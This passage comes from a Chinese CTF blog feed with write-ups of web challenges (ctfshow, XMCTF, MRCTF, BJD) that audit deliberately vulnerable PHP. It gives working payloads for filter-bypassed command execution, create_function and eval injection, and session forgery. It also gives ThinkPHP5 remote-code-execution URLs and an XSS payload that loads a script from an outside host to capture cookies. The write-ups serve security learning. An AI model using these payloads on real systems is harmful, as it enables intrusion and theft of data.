class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/['\*\"[?]/"</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'非预期修复*2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//传整数，但是正则过滤了.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;</span><br><span class="line"> <span class="comment">//判断是回文串又不是回文串</span></span><br><span class="line">    </span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据Ying师傅博客写的这里用浮点数精度的问题就可以绕过</span></span><br><span class="line">payload:num=<span class="number">1000000000000000.00000000000000010</span></span><br></pre></td></tr></table></figure><p>第二层</p><p>MD5硬碰</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mport hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>**<span class="number">33</span>):</span><br><span class="line">    i = str(i)</span><br><span class="line">    num = <span class="string">'0e'</span> + i</span><br><span class="line">    md5 = hashlib.md5(num.encode()).hexdigest()</span><br><span class="line">    md5 = hashlib.md5(md5.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(md5)</span></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():</span><br><span class="line">        print(<span class="string">'success str:&#123;&#125;  md5(str):&#123;&#125;'</span>.format(num, md5))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> int(i) % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">         print(i)</span><br><span class="line">//结果：<span class="number">0e1138100474</span></span><br></pre></td></tr></table></figure><p>第三层</p><p>ban了很多命令，这里可以用\斜杠来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flag=ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure><p>所以payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure><p>在网页源码处找到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMCTF</title>
      <link href="/2020/04/29/XMCTF/"/>
      <url>/2020/04/29/XMCTF/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-EASY-WEB1"><a href="#0x01-EASY-WEB1" class="headerlink" title="0x01:EASY_WEB1"></a>0x01:EASY_WEB1</h3><a id="more"></a><p>直接给了源码，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure><p>变量覆盖,extract($_POST)打开了全局变量POST，可以用post的值来覆盖key绕过第一个条件，后面的正则匹配通过查资料发现是一个创建函数</p><p>payload:?act=\create_function&amp;arg=){}var_dump(scandir(‘../‘));//</p><p>相当于是function xxx(arg){}=function(){var_dump(scandir(‘../‘));}//){},后面的两个斜杠注释了后面的内容，这样函数就完整了</p><img src="/2020/04/29/XMCTF/1.png" class=""><p>可以看到有”ffflll4g”文件，读取文件就可以了</p><h4 id="0X02：WEB7"><a href="#0X02：WEB7" class="headerlink" title="0X02：WEB7"></a>0X02：WEB7</h4><p>打开地址，源码给了，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//大小写字母和数字都被过滤了，考虑用编码进行绕过，之前碰到过用取反再url编码可以绕过</span></span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//通过传一个中间变量$_,在通过$_()调用getFlag()方法读取，这里相当于是code=$_=getFlag;getFlag();</span></span><br></pre></td></tr></table></figure><p>payload：?code=$<em>=~%98%9A%8B%B9%93%9E%98;$</em>();相当于是code=$_=getFlag;getFlag();</p><h4 id="0X03-WEB4"><a href="#0X03-WEB4" class="headerlink" title="0X03:WEB4"></a>0X03:WEB4</h4><p>打开题目给了一串key：e086aa137fa19f67d27b39d0eca18610，MD5解密一下，是一串ip地址，1.1.1.1,用burp抓包伪造ip</p><img src="/2020/04/29/XMCTF/2.png" class=""><p>访问dhudndrgrhs.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]); </span><br><span class="line"><span class="comment">//几乎所有的远程命令执行漏洞都被ban了，这里可以利用php的字符串拼接，拼接命令来绕过正则</span></span><br><span class="line">payload=$a=<span class="string">'sys'</span>.<span class="string">'tem'</span>;$a(<span class="string">'cat flag.php'</span>);</span><br><span class="line">可以看到flag.php文件，读取，在网页源码处发现flag</span><br></pre></td></tr></table></figure><h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class=""><p>可以看到提示是thinkphp5版本，直接上payload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php？s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo();</span><br></pre></td></tr></table></figure><img src="/2020/04/29/XMCTF/4.png" class=""><p>成功回显phpinfo页面，下面就可以爆目录文件了</p><img src="/2020/04/29/XMCTF/5.png" class=""><p>在根目录下找到了flag文件，直接读取 system(“cat /flag”)即可</p><h4 id="0X05-webEASYSESSION"><a href="#0X05-webEASYSESSION" class="headerlink" title="0X05:webEASYSESSION"></a>0X05:webEASYSESSION</h4><p>给了源码，审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">'content'</span>] ? <span class="string">"---mylocalnote---\n"</span> . $_GET[<span class="string">'content'</span>] : <span class="string">""</span>;</span><br><span class="line">$name = @$_GET[<span class="string">'name'</span>] ? $_GET[<span class="string">'name'</span>] : <span class="string">''</span>;</span><br><span class="line">str_replace(<span class="string">'/'</span>, <span class="string">''</span>, $name);</span><br><span class="line">str_replace(<span class="string">'\\'</span>, <span class="string">''</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">"/tmp/"</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Thank u,&#123;$_SESSION['username']&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure><p>下面是有关session的知识点找到东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session反序列化</span><br><span class="line">PHP使用文件存储Session信息。因此如果我们把Session文件替换了，写入admin信息，那么Flag就会出来了。PHP的Session文件以”sess_”开头，后接Session ID，Session ID仅有[A-Za-z0-9-0]构成。Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。这种情况下，Session文件的内容为(属性名)|(序列化数据)。在访问Session数据的时候，PHP会自动反序列化相应数据。那么，我们构造Note的标题名为”|N;admin|b:1;”。这样反序列化的结果就是admin&#x3D;&#x3D;bool(true)。我们就伪造了admin身份。而我们访问的时候，通过传递Cookie的值PHPSESSID为我们想要的Session ID，PHP就会去反序列化相应的Session文件。</span><br></pre></td></tr></table></figure><p>payload:?content=|N;username|s:5:%22admin%22;&amp;name=sess_p4c8k2sf8gkv0bb9j8uu6r7d99</p><p>成功写入名为username=admin的sessionID<br>再访问flag.php，传上cookie即可</p><h4 id="0X06禁止套娃"><a href="#0X06禁止套娃" class="headerlink" title="0X06禁止套娃"></a>0X06禁止套娃</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">flag在哪里呢？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//无参RCE</span></span><br><span class="line"><span class="comment">//localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span></span><br><span class="line"><span class="comment">//scandir() 列出 images 目录中的文件和目录。</span></span><br><span class="line"><span class="comment">//readfile() 输出一个文件。</span></span><br><span class="line"><span class="comment">//current() 返回数组中的当前单元, 默认取第一个值。</span></span><br><span class="line"><span class="comment">//pos() current() 的别名。</span></span><br><span class="line"><span class="comment">//next() 函数将内部指针指向数组中的下一个元素，并输出。</span></span><br><span class="line"><span class="comment">//array_reverse()以相反的元素顺序返回数组。</span></span><br><span class="line"><span class="comment">//highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> xm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJD2MRCTF</title>
      <link href="/2020/03/29/BJD2MRCTF/"/>
      <url>/2020/03/29/BJD2MRCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="MR"><a href="#MR" class="headerlink" title="MR"></a>MR</h2><a id="more"></a><h4 id="0X01-套娃"><a href="#0X01-套娃" class="headerlink" title="0X01: 套娃"></a>0X01: 套娃</h4><p>访问题目地址，页面没有什么有用的信息，查看网页源码，找到信息</p><img src="/2020/03/29/BJD2MRCTF/MR1.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span><span class="comment">//这里相当于substr_count($query, '_') === 0 &amp;&amp; substr_count($query, '%5f') == 0</span></span><br><span class="line">这里坑可能是出题人不小心没有打上对于$query传值的方式，后来去百度的时候发现是有一个变量$q_w_q用_GET来传值的，这里对<span class="string">'_'</span>进行了限制，可以用php的特性用.来替代</span><br><span class="line">($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>])<span class="comment">//这里可以用%0a绕过</span></span><br><span class="line"> payload：?b.u.p.t=<span class="number">23333</span>%<span class="number">0</span>a&amp;q.w.q=ls</span><br></pre></td></tr></table></figure><p>爆出下一步路径</p><img src="/2020/03/29/BJD2MRCTF/MR2.png" class=""><p>访问，暂时没有有用的信息，还是查看源码，发现一段jsfuck加密的密文，解密：post me Merak</p><p>用burp来进行post传Merak，爆出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it? <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//直接说一下构造payload的思路</span></span><br><span class="line"><span class="number">1.</span>ip===<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>构造伪IP地址，刚开始想到的是X-Forwarded-<span class="keyword">For</span>,发现不行，想到了之前比赛收集的类似的伪构造，client-IP可用</span><br><span class="line"><span class="number">2.</span>file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> 用php伪协议php:<span class="comment">//input可以post数据</span></span><br><span class="line"><span class="number">3.</span>change($_GET[<span class="string">'file'</span>])，我们最后肯定是要读取flag.php的，根据给的加密方式反向解密，推算出$v为fj]a&amp;f\b，在进行base64加密，这里要注意要在本地base64加密，网上的加密有点问题</span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/MR3.png" class=""><h4 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h4><p>文件上传题，尝试过小马之后都失败了，上传一个.htaccess，成功</p><p>再上传小马，成功</p><p>用蚁剑连接，根目录下flag</p><h2 id="BJD"><a href="#BJD" class="headerlink" title="BJD"></a>BJD</h2><h4 id="0X01-old-hacker"><a href="#0X01-old-hacker" class="headerlink" title="0X01:old hacker"></a>0X01:old hacker</h4><img src="/2020/03/29/BJD2MRCTF/old1.png" class=""><p>可以看到提示是thinkphp5的，用exp测试一下，利用报错收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;dir</span><br></pre></td></tr></table></figure><img src="/2020/03/29/BJD2MRCTF/old2.png" class=""><p>是thinkphp5.2.23版本的，去找一下有关版本的漏洞，找到了可以利用的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=<span class="string">'id'</span></span><br></pre></td></tr></table></figure><p>id是可以控制的，可以直接读取根目录下的flag</p><h4 id="0X02：XSS"><a href="#0X02：XSS" class="headerlink" title="0X02：XSS"></a>0X02：XSS</h4><p>这道题用到的是php可用的反序列化原生类，以下是exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>题目扫一遍发现有git泄露，用Githack拿到源码</p><img src="/2020/03/29/BJD2MRCTF/xss1.png" class=""><p>用上面的方式生成序列化数据进行测试，成功弹窗</p><img src="/2020/03/29/BJD2MRCTF/xss2.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script src='http://xss.fbisb.com/xss.php?do=login'&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过上面的运行结果作为payload打，在cookie里可以找到flag</p><h4 id="0X03-Duangshell"><a href="#0X03-Duangshell" class="headerlink" title="0X03:Duangshell"></a>0X03:Duangshell</h4><p>打开题目有提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">how can i give you source code? .swp?!</span><br></pre></td></tr></table></figure><p>访问/.index.php.swp得到源码，用<code>vim -r index.php</code>恢复源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span 